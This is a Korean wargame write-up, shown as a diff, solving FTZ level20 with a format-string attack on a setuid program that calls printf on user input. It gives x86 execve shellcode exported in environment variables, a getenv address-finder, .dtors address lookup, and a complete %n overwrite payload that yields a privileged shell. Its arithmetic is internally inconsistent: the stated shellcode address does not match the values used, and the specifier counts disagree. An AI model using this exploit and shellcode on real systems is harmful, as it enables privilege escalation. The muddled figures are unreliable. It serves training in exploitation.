@@ -1,0 +1,346 @@
+
+
+포맷스트링은 c언어 printf 에서 사용하는 %d, %x, %f 같은 문자
+
+ %c  단일 문자 
+
+ %d  부호 있는 10진 정수
+
+ %i  부호 있는 10진 정수, %d 와 같음
+
+ %f  부호 있는 10진 실수
+
+ %s  문자열
+
+ %o  부호 없는 8진수
+
+ %u  부호 없는 10진수
+
+ %x  부호 없는 16진수
+
+ %e  부동 소수점 표기, e 사용
+
+ %n  쓰인 총 바이트 수
+
+
+
+@@@@@@
+
+
+
+[level20@ftz level20]$ cat hint
+
+
+
+#include <stdio.h>
+
+main(int argc,char **argv)
+
+{ char bleh[80];
+
+  setreuid(3101,3101);
+
+  fgets(bleh,79,stdin);
+
+  printf(bleh);
+
+}
+
+ 
+
+ 
+
+fgets로 입력받는 문자열의 길이에 제한을 79로 두었기 때문에 그동안 풀어온 BOF로는 문제를 풀 수 없겠네요..
+
+printf(bleh); -> 이부분에서 포맷스트링공격이 가능함을 예상할 수 있습니다.
+
+먼저 실행시켜보며 반응을 보겠습니다.
+
+ 
+
+ [level20@ftz level20]$ ./attackme
+
+AAAA
+
+AAAA
+
+[level20@ftz level20]$ ./attackme
+
+%x %x %x %x
+
+4f 4212ecc0 4207a750 25207825
+
+[level20@ftz level20]$ ./attackme
+
+%08x %08x %08x %08x
+
+0000004f 4212ecc0 4207a750 78383025
+
+ 
+
+ 
+
+%x를 넣어줬을 때, 메모리를 읽어낸 듯한 느낌이 옵니다. 
+
+더 시도해보겠습니다.
+
+
+[level20@ftz level20]$ ./attackme
+
+AAAA %08x %08x %08x %08x %08x
+
+AAAA 0000004f 4212ecc0 4207a750 41414141 38302520
+
+
+
+어? AAAA로 입력한 부분이 뒤에서 다시 출력됨을 확인할 수 있습니다.
+
+이것으로 메모리구조를 어렴풋이 생각해볼 수 있겠네요
+
+
+
+[level20@ftz tmp]$ gdb ./attackme
+
+GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
+
+Copyright 2003 Free Software Foundation, Inc.
+
+GDB is free software, covered by the GNU General Public License, and you are
+
+welcome to change it and/or distribute copies of it under certain conditions.
+
+Type "show copying" to see the conditions.
+
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+
+This GDB was configured as "i386-redhat-linux-gnu"...
+
+(gdb) disas main
+
+No symbol "main" in current context.
+
+gdb를 통해 분석하려 했지만 main 함수가 보이지 않네요? 심볼이 지워진 듯합니다.
+
+ 
+
+
+ (gdb) info func		@## info func 를 입력해서 이프로그램의 main이나 다른것을 볼수있다.@
+
+All defined functions:
+
+
+
+Non-debugging symbols:
+
+0x080482c8  fgets
+
+0x080482d8  __libc_start_main
+
+0x080482e8  printf
+
+0x080482f8  setreuid
+
+(gdb) disas __libc_start_main
+
+Dump of assembler code for function __libc_start_main:
+
+0x080482d8 <__libc_start_main+0>: jmp    *0x80495b0
+
+0x080482de <__libc_start_main+6>: push   $0x8
+
+0x080482e3 <__libc_start_main+11>: jmp    0x80482b8
+
+End of assembler dump.
+
+main이 없고 다른 이상한게 있지만 이것으로 정보를 찾기힘들다.
+
+
+
+그렇지만 위에서 포맷스트링을 했을떄
+
+[level20@ftz level20]$ ./attackme
+
+AAAA %08x %08x %08x %08x %08x
+
+AAAA 0000004f 4212ecc0 4207a750 41414141 38302520
+
+ 
+
+이 부분을 보면, AAAA로부터 3개의 %x를 지나고, 4번째 %x에 AAAA가 출력됨이 보입니다.
+
+printf 함수 뒤로 12바이트 후에 AAAA 나온다.
+
+
+
+그러면 기본 메모리 구조는??
+
+ret [ 4 ] 와  SFP [ 4 ]  그리고 중간에 더미 ( ? )	
+
+bleh [ 80 ] >> 12바이트후에 반복되므로 더미는 [ 12 ]
+
+그리고 printf(bleh) 
+
+
+
+우리가 할것은
+
+%n을 이용한 메모리변조 방법이다.
+
+
+포맷스트링의 입력 패턴은
+
+ (printf “AAAA낮은주소BBBB높은주소”)%8x%8x%8x%정수c%n%정수c%n
+
+            입니다.
+
+낮은주소, 높은주소를 나누는 이유
+
+  -> 숫자가 너무 커 메모리를 한번에 덮어쓸 수 없는 경우, 2바이트씩 나누어 반씩 넣어주기 위함입니다. 
+
+
+높은주소를 구하기위
+
+objdump -h attackme | grep .dtors 를 입력한다
+
+dtors(소멸자)
+
+그러면 소멸자 주소는 2**2 = 4
+
+08049594 +4 = 08049598 이다.
+@@@@@@@@@@@@@@@@@@@
+
+objdump -t attackme | grep .dtors
+
+입력하면 소멸자 주소를 얻을수있다.
+
+@@@@@@@@@@@@@@@@@@@@@
+이제 다구했으니 마지막으로 환경변수에 쉘코드를 등록하고 공격한다.
+
+
+export SHEEL=`perl -e 'print “\x90”x1000,”\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80”,"\x90"x30'`
+
+echo &SHEEL
+
+지금까지 해왔던것처럼
+
+SHEEL.c 를 만들어서 SHEEL 로 컴파일하고 실행해서 주소값을 얻는다
+
+
+
+
+
+
+
+
+
+
+
+#############################################################
+
+다른풀이
+
+
+FSB 풀이이므로		>> ( GOT 값을 즉 버퍼오버플로우를 발생시키기 위해서는
+				print 구문을 두번 호출해야하는데 이문제는 한번만 호출한다.
+				따라서 소멸자 주소(.DTORS) 주소를 이용해서 풀어야한다.
+
+포멧스트링 버그를 이용해 메모리는 변조하는 기술
+
+%d 정수형 10진수 상수
+
+%f 실수형 상수
+%c 문자 값
+%s 문자 스트링
+%x 양의 정수(16진수)
+%n 쓰인 총 바이트 수를 지정할 정수형 포인터
+
+
+./attackme
+AAAA %x %x %x %x 를 입력했을떄
+
+AAAA 4f 40152460 40098500 41414141
+
+세번쨰 %x부터 AAAA가 반복된다.
+
+이제 main이 종료할떄 생성되는 소멸자 부분을 찾아보자.
+
+.dtors(소멸자)
+
+이문제를 해결하기 위해서는
+
+1. 소멸자 주소
+
+2. 쉘코드 환경변수 등록과 주소
+
+가필요하다 일단 첫번쨰부터 해보자
+
+objdump -t attackme | grep .dtors 를 입력하면
+
+[level20@ftz level20]$ objdump -t attackme | grep .dtors
+08049594 l    d  .dtors 00000000
+08049594 l     O .dtors 00000000              (null)
+08049598 l     O .dtors 00000000              (null)
+
+가 나오므로 주소는 08049598 이다.
+
+소멸자 주소 == 08049598
+
+이제 환경변수 등록을 하고 주소를 획득해보자.
+
+export SHELL=$(python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+등록하고
+
+이제 코드를 입력하자
+
+vi SHELL.c
+
+int main(){
+        printf("%p\n",getenv("SHELL"));
+        return 0;
+}
+
+입력하고
+
+gcc -o SHELL SHELL.c 
+
+컴파일하고 ./SHELL 로 실행해서 주소를얻는다.
+
+ret (환경변수 주소) = 0xbffffc52
+
+
+이제 다구했으므로 페이로드를 작성해보자.
+
+이러한 main 이 디버깅이 안되는 문제 또는 이러한 유형문제같은경우
+
+4바이트 공간 + 소멸자 앞주소 + 4바이트 공간 + 소멸자 뒷주소 + %문자*3 + %[쉘코드 뒷주소만큼의 문자수]c + %n+%쉘코드 앞주소만큼의 문자수]c + %n 
+
+으로 작성
+
+
+
+소멸자의 앞주소 = 08049598
+
+소멸자의 뒷주소 (08049598 +2) = 0804959a
+
+%문자*2 = "%8x"*2
+
+쉘코드 뒷주소만큼의 문자수 = fee6( 10진수 65254) - 지금까지 출력된 문자수 ( 4+4+4+4+8*3) = 65254-40 =65214
+
+쉘코드 앞주소만큼의 문자수 = bfff( 10진수 49151) - 지금까지 출력된 문자수 (65254) = 1bfff( 10진수 114687 >> 보수 방식으로 계산해서 -값이 출력안되도록 해줌)
+
+- 지금까지 출력된 문자수(hex=fee6, dex=65254) = 49433 
+
+따라서  최종적인 페이로드는 
+
+(python -c 'print"\x90"*4+"\x98\x95\x04\x08"+"\x90"*4+"\x9a\x95\x04\x08"+"%8x"*3+"%65214c"+"%n"+"%49433c"+"%n"';cat)|./attackme
+
+가 최종 페이로드이다.
+
+이것을 입력하면 level 20 이 끝나게 된다.
+
+(clear 계정의 패스워드가 나오게된다.)
+
+
+집에서 : 주소 :
+https://leeggoggal.tistory.com/30?category=706726
